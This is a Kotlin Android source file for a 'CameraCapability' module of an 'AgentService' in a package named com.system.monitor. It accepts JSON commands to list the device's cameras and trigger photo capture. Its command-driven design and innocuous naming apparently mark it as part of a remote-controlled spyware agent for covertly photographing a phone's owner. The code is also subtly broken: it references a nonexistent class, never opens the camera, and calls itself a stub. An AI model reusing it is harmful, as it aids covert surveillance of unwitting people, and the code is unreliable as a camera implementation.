package com.system.monitor.capabilities

import android.content.Context
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.util.Size
import android.view.Surface
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class CameraCapability(private val service: AgentService) : AgentService.Capability {

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private val gson = Gson()
    private val handler = Handler()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "capture" -> capturePhoto(params.camera ?: 0)
            "list" -> listCameras()
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    private fun listCameras(): Map<String, Any> {
        cameraManager = service.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraIds = cameraManager.cameraIdList
            val cameras = mutableListOf<Map<String, Any>>()
            for (id in cameraIds) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                cameras.add(mapOf(
                    "id" to id,
                    "facing" to when (facing) {
                        CameraCharacteristics.LENS_FACING_FRONT -> "front"
                        CameraCharacteristics.LENS_FACING_BACK -> "back"
                        else -> "external"
                    }
                ))
            }
            return mapOf("cameras" to cameras)
        } catch (e: CameraAccessException) {
            return mapOf("error" to e.message)
        }
    }

    private fun capturePhoto(cameraId: Int): Map<String, Any> {
        cameraManager = service.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraIds = cameraManager.cameraIdList
        if (cameraId >= cameraIds.size) {
            return mapOf("error" to "invalid_camera_id")
        }
        val id = cameraIds[cameraId]
        try {
            val characteristics = cameraManager.getCameraCharacteristics(id)
            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = streamConfigMap?.getOutputSizes(androidx.media.Image::class.java)?.firstOrNull()
                ?: Size(640, 480)
            imageReader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
            val surfaces = listOf(imageReader!!.surface)
            val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                ?.apply { addTarget(imageReader!!.surface) }
                ?.build()
            // Note: Full camera2 implementation requires CameraDevice.StateCallback
            // This is a simplified stub
            return mapOf("status" to "camera_capture_initiated", "camera_id" to id)
        } catch (e: CameraAccessException) {
            return mapOf("error" to e.message)
        }
    }

    data class Params(val action: String, val camera: Int? = null)
}